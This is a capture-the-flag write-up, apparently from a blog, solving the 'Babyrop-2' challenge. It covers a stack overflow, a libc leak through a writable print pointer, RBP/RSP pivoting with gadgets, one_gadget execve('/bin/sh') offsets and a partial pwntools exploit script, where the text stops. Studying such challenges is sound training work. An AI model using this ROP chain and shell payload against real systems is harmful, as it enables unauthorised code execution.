<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716065717.png" alt="Pasted image 20250716065717" /></p>
<h3 id="the-exploit-strategy">The exploit strategy</h3>
<p>Reaching this point was relatively easy; the real challenge begins now. Since we can overwrite RIP but cannot execute code on the stack due to NX protection, we need to leak the libc address at runtime.</p>
<p>The first thing I did was recall the print function from the binary. As you can see below, the print function behaves differently from setbuf or memset.</p>
<p>It's also worth mentioning that the print function is safe from format-string vulnerabilities.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716071941.png" alt="Pasted image 20250716071941" /></p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>gef➤  x/32xg </span><span style="color:#d08770;">0x404000
</span><span style="color:#d08770;">0x404000</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x404010 </span><span>&lt;</span><span style="color:#b48ead;">print</span><span>&gt;:       </span><span style="color:#d08770;">0x00007ffff7e2bbe0      0x00007ffff7fa85c0
</span><span style="color:#d08770;">0x404020 </span><span>&lt;completed</span><span style="color:#d08770;">.0</span><span>&gt;: </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x404030</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x404040</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x404050</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x404060</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x404070</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x404080</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x404090</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x4040a0</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x4040b0</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x4040c0</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x4040d0</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x4040e0</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span style="color:#d08770;">0x4040f0</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
</span><span>
</span><span>gef➤  got
</span><span>──────────────────────────────────────────────────────────────────────────────────────── /host/vuln ────────────────────────────────────────────────────────────────────────────────────────
</span><span>
</span><span style="color:#bf616a;">GOT </span><span>protection: Full RelRO | </span><span style="color:#bf616a;">GOT </span><span>functions: </span><span style="color:#d08770;">3
</span><span> 
</span><span>[</span><span style="color:#d08770;">0x403fd8</span><span>] setbuf@</span><span style="color:#bf616a;">GLIBC_2</span><span style="color:#d08770;">.2.5</span><span>  →  </span><span style="color:#d08770;">0x7ffff7e33750
</span><span>[</span><span style="color:#d08770;">0x403fe0</span><span>] memset@</span><span style="color:#bf616a;">GLIBC_2</span><span style="color:#d08770;">.2.5</span><span>  →  </span><span style="color:#d08770;">0x7ffff7f2d400
</span><span>[</span><span style="color:#d08770;">0x403fe8</span><span>] read@</span><span style="color:#bf616a;">GLIBC_2</span><span style="color:#d08770;">.2.5</span><span>  →  </span><span style="color:#d08770;">0x7ffff7ebfa50
</span><span>gef➤  
</span><span>
</span></code></pre>
<p>However, there's a trick here: while the GOT table is read-only, the print function is located in a writable memory area.</p>
<p>Since the binary doesn't contain a pop rdi gadget, let's examine how print is called in main.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716072957.png" alt="Pasted image 20250716072957" /></p>
<p>Since the binary doesn't contain any <code>pop rdi</code> gadget. So take a closer look the how <code>print</code> called in the <code>main</code>.</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#d08770;">0x0000000000401211 </span><span>&lt;+</span><span style="color:#d08770;">66</span><span>&gt;:    mov    rdx,</span><span style="color:#bf616a;">QWORD PTR </span><span>[rip+</span><span style="color:#d08770;">0x2df8</span><span>]        </span><span style="color:#65737e;"># 0x404010 &lt;print&gt;
</span><span style="color:#d08770;">0x0000000000401218 </span><span>&lt;+</span><span style="color:#d08770;">73</span><span>&gt;:    lea    rax,[rbp-</span><span style="color:#d08770;">0x20</span><span>]
</span><span style="color:#d08770;">0x000000000040121c </span><span>&lt;+</span><span style="color:#d08770;">77</span><span>&gt;:    mov    rdi,rax
</span><span style="color:#d08770;">0x000000000040121f </span><span>&lt;+</span><span style="color:#d08770;">80</span><span>&gt;:    call   rdx
</span></code></pre>
<p>The parameter value comes from $rbp-0x20. When we run GDB again and set a breakpoint at *main+0x49, $rbp-0x20 points to the start of the input.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716074707.png" alt="Pasted image 20250716074707" /></p>
<h3 id="the-problem-of-rbp">The problem of $rbp</h3>
<p>Updated payload</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>print_addr = </span><span style="color:#d08770;">0x404010
</span><span>print_call = </span><span style="color:#d08770;">0x401211
</span><span>
</span><span>payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">0</span><span>: [
</span><span>        print_addr
</span><span>        ],
</span><span>    </span><span style="color:#d08770;">40</span><span>:[
</span><span>        print_call
</span><span>      ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
</span></code></pre>
<h4 id="remembering-basics">Remembering basics</h4>
<p>The problem is that when we overwrite RIP, we also overwrite the RBP register.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716080336.png" alt="Pasted image 20250716080336" /></p>
<p>The RBP register is located 8 bytes before the RIP register.
The leave instruction performs two operations: <code>Set RSP to RBP, then pop RBP</code></p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>mov rsp, rbp
</span><span>pop rbp
</span></code></pre>
<p>Since overwriting the RBP register with an invalid value prevents correct address referencing, we must set the RBP register to a valid value.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716080308.png" alt="Pasted image 20250716080308" /></p>
<p>To do this, update the payload with print_addr+0x20. This ensures that the RBP register is correctly set.</p>
<p>The updated payload:</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>print_addr = </span><span style="color:#d08770;">0x404010
</span><span>print_call = </span><span style="color:#d08770;">0x401211
</span><span>
</span><span>payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">0</span><span>: [
</span><span>        print_addr
</span><span>        ],
</span><span>    </span><span style="color:#d08770;">32</span><span>:[
</span><span>        print_addr+</span><span style="color:#d08770;">0x20</span><span>,
</span><span>        print_call
</span><span>      ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
</span></code></pre>
<p>The image below shows the successful leak of the print function's address.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716081544.png" alt="Pasted image 20250716081544" /></p>
<p>However, another problem needs to be resolved: after leaking the print address, execution landed at 0x404038, not the stack. Fortunately, execution landed in a writable memory area. Since we cannot control this address at the moment, we need a workaround.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716081920.png" alt="Pasted image 20250716081920" /></p>
<p>To overcome this, we must write to that area. Before leaking the print address, we'll prepare a landing area, then leak the address, and then we'll be in business.</p>
<p>To achieve that</p>
<blockquote>
<p>[!Steps]
Calling gets with buffer area 0x404038
Call print and leak the address of <code>print libc addr</code>
Calculate the <code>system</code>, <code>/bin/sh</code> addresses
We are good to go</p>
</blockquote>
<p>First, set RBP. Some useful gadgets are shared below:</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>root@30ee3317d43a:/host</span><span style="color:#65737e;"># python3 /tools/ROPgadget/ROPgadget.py --binary vuln --depth 5 --filter &#39;pop rbp&#39;
</span><span>Gadgets information
</span><span>============================================================
</span><span style="color:#d08770;">0x000000000040115b </span><span>: add byte ptr [rcx], al ; pop rbp ; ret
</span><span style="color:#d08770;">0x0000000000401225 </span><span>: add cl, cl ; ret
</span><span style="color:#d08770;">0x000000000040115c </span><span>: add dword ptr [rbp - </span><span style="color:#d08770;">0x3d</span><span>], ebx ; nop ; ret
</span><span style="color:#d08770;">0x0000000000401017 </span><span>: add esp, </span><span style="color:#d08770;">8 </span><span>; ret
</span><span style="color:#d08770;">0x0000000000401016 </span><span>: add rsp, </span><span style="color:#d08770;">8 </span><span>; ret
</span><span style="color:#d08770;">0x00000000004011cd </span><span>: leave ; ret
</span><span style="color:#d08770;">0x000000000040117c </span><span>: mov ebp, esp ; pop rcx ; ret
</span><span style="color:#d08770;">0x000000000040117b </span><span>: mov rbp, rsp ; pop rcx ; ret
</span><span style="color:#d08770;">0x0000000000401180 </span><span>: nop ; pop rbp ; ret
</span><span style="color:#d08770;">0x00000000004010ef </span><span>: nop ; ret
</span><span style="color:#d08770;">0x000000000040115d </span><span>: pop rbp ; ret
</span><span style="color:#d08770;">0x000000000040117e </span><span>: pop rcx ; ret
</span><span style="color:#d08770;">0x000000000040101a </span><span>: ret
</span></code></pre>
<p>At address <code>0x40115d</code> the address of helpfull to set.</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#d08770;">0x40115d
</span><span style="color:#d08770;">0x404038</span><span>+</span><span style="color:#d08770;">0x20
</span></code></pre>
<p>The addition of 0x20 is the the gets function parameter also came from <code>RBP-0x20</code></p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>   </span><span style="color:#d08770;">0x0000000000401205 </span><span>&lt;+</span><span style="color:#d08770;">54</span><span>&gt;:    lea    rax,[rbp-</span><span style="color:#d08770;">0x20</span><span>]
</span><span>   </span><span style="color:#d08770;">0x0000000000401209 </span><span>&lt;+</span><span style="color:#d08770;">58</span><span>&gt;:    mov    rdi,rax
</span><span>   </span><span style="color:#d08770;">0x000000000040120c </span><span>&lt;+</span><span style="color:#d08770;">61</span><span>&gt;:    call   </span><span style="color:#d08770;">0x401183 </span><span>&lt;gets&gt;
</span></code></pre>
<p>After gets called, a significant amount of buffer can land in the writable area.</p>
<p>Test the payload.</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>landing_addr = </span><span style="color:#d08770;">0x404038
</span><span>print_addr   = </span><span style="color:#d08770;">0x404010
</span><span>print_call   = </span><span style="color:#d08770;">0x401211
</span><span>pop_rbp_ret  = </span><span style="color:#d08770;">0x40115d
</span><span>gets_call    = </span><span style="color:#d08770;">0x401205
</span><span>
</span><span>payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">40</span><span>:[
</span><span>        pop_rbp_ret,
</span><span>        landing_addr+</span><span style="color:#d08770;">0x20</span><span>,
</span><span>        gets_call
</span><span>    ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
</span></code></pre>
<p>The screenshot below proves that the RBP register was overwritten with <code>0x404058</code></p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716090734.png" alt="Pasted image 20250716090734" /></p>
<p>To avoid losing program control, we must re-overflow the buffer. The screenshot below confirms that address 0x404038 was overwritten with the input buffer.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716091703.png" alt="Pasted image 20250716091703" /></p>
<p>The updated payload.</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>
</span><span>landing_addr = </span><span style="color:#d08770;">0x404038
</span><span>print_addr   = </span><span style="color:#d08770;">0x404010
</span><span>print_call   = </span><span style="color:#d08770;">0x401211
</span><span>pop_rbp_ret  = </span><span style="color:#d08770;">0x40115d
</span><span>gets_call    = </span><span style="color:#d08770;">0x401205
</span><span>
</span><span>
</span><span style="color:#65737e;">## Set rbp to 0x404058
</span><span>first_stage_payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">40</span><span>:[
</span><span>        pop_rbp_ret,
</span><span>        landing_addr+</span><span style="color:#d08770;">0x20</span><span>,
</span><span>        gets_call
</span><span>    ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(first_stage_payload)
</span><span>
</span><span>io.</span><span style="color:#bf616a;">recv</span><span>()
</span><span>
</span><span>
</span><span>second_stage_payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">0</span><span>: [
</span><span>        print_addr
</span><span>        ],
</span><span>    </span><span style="color:#d08770;">32</span><span>:[
</span><span>        print_addr+</span><span style="color:#d08770;">0x20</span><span>,
</span><span>        print_call,
</span><span>        </span><span style="color:#d08770;">0x4141414141414141</span><span>,
</span><span>        </span><span style="color:#d08770;">0x4242424242424242
</span><span>        ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(second_stage_payload)
</span><span>
</span><span>
</span><span style="color:#65737e;">## get second output after gets called
</span><span style="color:#96b5b4;">print</span><span>(io.</span><span style="color:#bf616a;">recv</span><span>())
</span><span>
</span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">second input out:</span><span>&quot;)
</span><span>leak = int.</span><span style="color:#bf616a;">from_bytes</span><span>(io.</span><span style="color:#bf616a;">recv</span><span>(), &#39;</span><span style="color:#a3be8c;">little</span><span>&#39;)
</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(leak))
</span></code></pre>
<p>The problem with this payload is that internal calls within the print function attempt to write to lower addresses on the stack. The image below shows _IO_file_xsputn+0xa trying to push 0x404000. When this happens, it continuously goes to lower addresses, which are not writable. The writable area starts from 0x404000.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716095624.png" alt="Pasted image 20250716095624" /></p>
<p>Therefore, we need to align RSP to a higher address. The stack in the print function should remain within 0x404000 - 0x405000.</p>
<p>The gadget</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>(vuln/</span><span style="color:#bf616a;">ELF</span><span>/x86_64)&gt; search add rsp
</span><span>[</span><span style="color:#bf616a;">INFO</span><span>] Searching </span><span style="color:#b48ead;">for </span><span>gadgets</span><span style="background-color:#bf616a;color:#2b303b;">:</span><span> add rsp
</span><span>
</span><span>[</span><span style="color:#bf616a;">INFO</span><span>] File: vuln
</span><span style="color:#d08770;">0x0000000000401016</span><span>: add rsp, </span><span style="color:#d08770;">8</span><span>; ret;
</span></code></pre>
<p>The payload,</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>
</span><span>landing_addr = </span><span style="color:#d08770;">0x404038
</span><span>print_addr   = </span><span style="color:#d08770;">0x404010
</span><span>print_call   = </span><span style="color:#d08770;">0x401211
</span><span>pop_rbp_ret  = </span><span style="color:#d08770;">0x40115d
</span><span>gets_call    = </span><span style="color:#d08770;">0x401205
</span><span>add_rsp_8    = </span><span style="color:#d08770;">0x401016
</span><span>leave_ret    = </span><span style="color:#d08770;">0x4011cd
</span><span>
</span><span style="color:#65737e;">### Set rbp to 0x404058 ###
</span><span>
</span><span>first_stage_payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">0x28</span><span>: [
</span><span>        pop_rbp_ret,
</span><span>        landing_addr+</span><span style="color:#d08770;">0x20</span><span>,
</span><span>        gets_call
</span><span>        ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(first_stage_payload)
</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">first stage out: </span><span>{io.</span><span style="color:#bf616a;">recv</span><span>()}&#39;)
</span><span>
</span><span>second_stage_payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">0</span><span>: print_addr,
</span><span>    </span><span style="color:#d08770;">0x20</span><span>:[
</span><span>        print_addr+</span><span style="color:#d08770;">0x20</span><span>,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        print_call,
</span><span>        </span><span style="color:#d08770;">0x4141414141414141</span><span>,
</span><span>        </span><span style="color:#d08770;">0x4242424242424242</span><span>,
</span><span>        ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(second_stage_payload)
</span><span>
</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">second stage out: </span><span>{io.</span><span style="color:#bf616a;">recvline</span><span>()}&#39;)
</span><span>
</span><span>libc_puts_addr = </span><span style="color:#bf616a;">u64</span><span>(io.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>,</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
</span><span>
</span><span>log.</span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">LIBC LEAKED PUTS ADDR: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(libc_puts_addr)}&#39;)
</span></code></pre>
<p>The execution of this payload,</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250717003855.png" alt="Pasted image 20250717003855" /></p>
<p>The problem with this payload is that after successfully leaking the puts address from libc, execution landed at 0x404078. If we re-check the landed area, there are different values than what we put there.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250717004134.png" alt="Pasted image 20250717004134" /></p>
<p>This occurs because print's internal calls overwrite the payload body. To overcome this, RIP should land on a specific value. To properly set the RIP value, we need to manipulate the RSP value to higher addresses.</p>
<p>After some tries, the RIP value successfully landed beginning of the <code>second_stage_payload</code> .</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250717011046.png" alt="Pasted image 20250717011046" /></p>
<p>The payload shared below,</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>second_stage_payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">0</span><span>: </span><span style="color:#d08770;">0x4949494949494949</span><span>,
</span><span>    </span><span style="color:#d08770;">0x20</span><span>:[
</span><span>        print_addr+</span><span style="color:#d08770;">0x20</span><span>,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        add_rsp_8,
</span><span>        print_call,
</span><span>        </span><span style="color:#d08770;">0x4141414141414141</span><span>,
</span><span>        </span><span style="color:#d08770;">0x4242424242424242</span><span>,
</span><span>        ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(second_stage_payload)
</span><span>
</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">second stage out: </span><span>{io.</span><span style="color:#bf616a;">recvline</span><span>()}&#39;)
</span><span>
</span><span>libc_puts_addr = </span><span style="color:#bf616a;">u64</span><span>(io.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>,</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
</span><span>
</span><span>log.</span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">LIBC LEAKED PUTS ADDR: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(libc_puts_addr)}&#39;)
</span><span>
</span></code></pre>
<h3 id="preparing-code-execution">Preparing code execution</h3>
<p>At this point, the needings is clear, calculate libc base address and than calculate the system, <code>/bin/sh</code> address inside of libc. The knowledge of libc_base_address, no longer lack of gadget issue.</p>
<p>one_gadget</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>root@30ee3317d43a:/host</span><span style="color:#65737e;"># one_gadget ./libc.so.6
</span><span style="color:#d08770;">0x583ec </span><span style="color:#bf616a;">posix_spawn</span><span>(rsp+</span><span style="color:#d08770;">0xc</span><span>, &quot;</span><span style="color:#a3be8c;">/bin/sh</span><span>&quot;, </span><span style="color:#d08770;">0</span><span>, rbx, rsp+</span><span style="color:#d08770;">0x50</span><span>, environ)
</span><span>constraints:
</span><span>  address rsp+</span><span style="color:#d08770;">0x68 </span><span>is writable
</span><span>  rsp &amp; </span><span style="color:#d08770;">0xf </span><span>== </span><span style="color:#d08770;">0
</span><span>  rax == </span><span style="color:#bf616a;">NULL </span><span>|| {&quot;</span><span style="color:#a3be8c;">sh</span><span>&quot;, rax, rip+</span><span style="color:#d08770;">0x17301e</span><span>, r12, </span><span style="color:#d08770;">...</span><span>} is a valid argv
</span><span>  rbx == </span><span style="color:#bf616a;">NULL </span><span>|| (u16)[rbx] == </span><span style="color:#bf616a;">NULL
</span><span>
</span><span style="color:#d08770;">0x583f3 </span><span style="color:#bf616a;">posix_spawn</span><span>(rsp+</span><span style="color:#d08770;">0xc</span><span>, &quot;</span><span style="color:#a3be8c;">/bin/sh</span><span>&quot;, </span><span style="color:#d08770;">0</span><span>, rbx, rsp+</span><span style="color:#d08770;">0x50</span><span>, environ)
</span><span>constraints:
</span><span>  address rsp+</span><span style="color:#d08770;">0x68 </span><span>is writable
</span><span>  rsp &amp; </span><span style="color:#d08770;">0xf </span><span>== </span><span style="color:#d08770;">0
</span><span>  rcx == </span><span style="color:#bf616a;">NULL </span><span>|| {rcx, rax, rip+</span><span style="color:#d08770;">0x17301e</span><span>, r12, </span><span style="color:#d08770;">...</span><span>} is a valid argv
</span><span>  rbx == </span><span style="color:#bf616a;">NULL </span><span>|| (u16)[rbx] == </span><span style="color:#bf616a;">NULL
</span><span>
</span><span style="color:#d08770;">0xef4ce </span><span style="color:#bf616a;">execve</span><span>(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span>&quot;, rbp-</span><span style="color:#d08770;">0x50</span><span>, r12)
</span><span>constraints:
</span><span>  address rbp-</span><span style="color:#d08770;">0x48 </span><span>is writable
</span><span>  rbx == </span><span style="color:#bf616a;">NULL </span><span>|| {&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span>&quot;, rbx, </span><span style="color:#bf616a;">NULL</span><span>} is a valid argv
</span><span>  [r12] == </span><span style="color:#bf616a;">NULL </span><span>|| r12 == </span><span style="color:#bf616a;">NULL </span><span>|| r12 is a valid envp
</span><span>
</span><span style="color:#d08770;">0xef52b </span><span style="color:#bf616a;">execve</span><span>(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span>&quot;, rbp-</span><span style="color:#d08770;">0x50</span><span>, [rbp-</span><span style="color:#d08770;">0x78</span><span>])
</span><span>constraints:
</span><span>  address rbp-</span><span style="color:#d08770;">0x50 </span><span>is writable
</span><span>  rax == </span><span style="color:#bf616a;">NULL </span><span>|| {&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span>&quot;, rax, </span><span style="color:#bf616a;">NULL</span><span>} is a valid argv
</span><span>  [[rbp-</span><span style="color:#d08770;">0x78</span><span>]] == </span><span style="color:#bf616a;">NULL </span><span>|| [rbp-</span><span style="color:#d08770;">0x78</span><span>] == </span><span style="color:#bf616a;">NULL </span><span>|| [rbp-</span><span style="color:#d08770;">0x78</span><span>] is a valid envp
</span></code></pre>
<p>Next steps is redirect code execution to this address. To achieve that.
After playing with RBP, finally successfully redirect code execution to execve.</p>
<p>Here is final exploit.</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/env python3
</span><span style="color:#65737e;"># -*- coding: utf-8 -*-
</span><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
</span><span>
</span><span>exe = context.binary = </span><span style="color:#bf616a;">ELF</span><span>(args.</span><span style="color:#bf616a;">EXE </span><span>or &#39;</span><span style="color:#a3be8c;">./vuln</span><span>&#39;)
</span><span>context.terminal = [&#39;</span><span style="color:#a3be8c;">tmux</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">splitw</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">-v</span><span>&#39;]
</span><span>
</span><span>host = args.</span><span style="color:#bf616a;">HOST </span><span>or &#39;</span><span style="color:#a3be8c;">192.168.1.101</span><span>&#39;
</span><span>port = </span><span style="color:#bf616a;">int</span><span>(args.</span><span style="color:#bf616a;">PORT </span><span>or </span><span style="color:#d08770;">42123</span><span>)
</span><span>
</span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">LOCAL_LIBC</span><span>:
</span><span>    libc = exe.libc
</span><span style="color:#b48ead;">elif </span><span>args.</span><span style="color:#bf616a;">LOCAL</span><span>:
</span><span>    library_path = libcdb.</span><span style="color:#bf616a;">download_libraries</span><span>(&#39;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&#39;)
</span><span>    </span><span style="color:#b48ead;">if </span><span>library_path:
</span><span>        exe = context.binary = ELF.</span><span style="color:#bf616a;">patch_custom_libraries</span><span>(exe.path, library_path)
</span><span>        libc = exe.libc
</span><span>    </span><span style="color:#b48ead;">else</span><span>:
</span><span>        libc = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&#39;)
</span><span style="color:#b48ead;">else</span><span>:
</span><span>    libc = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&#39;)
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">start_local</span><span>(</span><span style="color:#bf616a;">argv</span><span>=[], *</span><span style="color:#bf616a;">a</span><span>, **</span><span style="color:#bf616a;">kw</span><span>):
</span><span>    </span><span style="color:#65737e;">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">GDB</span><span>:
</span><span>        </span><span style="color:#b48ead;">return </span><span>gdb.</span><span style="color:#bf616a;">debug</span><span>([exe.path] + argv, </span><span style="color:#bf616a;">gdbscript</span><span>=gdbscript, *a, **kw)
</span><span>    </span><span style="color:#b48ead;">else</span><span>:
</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">process</span><span>([exe.path] + argv, *a, **kw)
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">start_remote</span><span>(</span><span style="color:#bf616a;">argv</span><span>=[], *</span><span style="color:#bf616a;">a</span><span>, **</span><span style="color:#bf616a;">kw</span><span>):
</span><span>    </span><span style="color:#65737e;">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
</span><span>    io = </span><span style="color:#bf616a;">connect</span><span>(host, port)
</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">GDB</span><span>:
